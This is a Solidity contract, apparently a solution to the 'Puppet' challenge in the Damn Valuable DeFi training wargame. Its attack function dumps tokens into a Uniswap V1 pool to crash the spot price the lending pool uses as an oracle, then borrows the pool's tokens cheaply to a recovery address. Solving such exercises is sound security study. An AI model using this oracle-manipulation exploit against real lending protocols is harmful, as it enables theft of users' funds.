//SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {PuppetPool} from "src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "src/puppet/IUniswapV1Exchange.sol";

contract AttackPuppet {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor (
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack(uint amount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));

        lendingPool.borrow{value:address(this).balance}(
            amount,
            recovery
        );
    }

    receive() external payable {
    }
}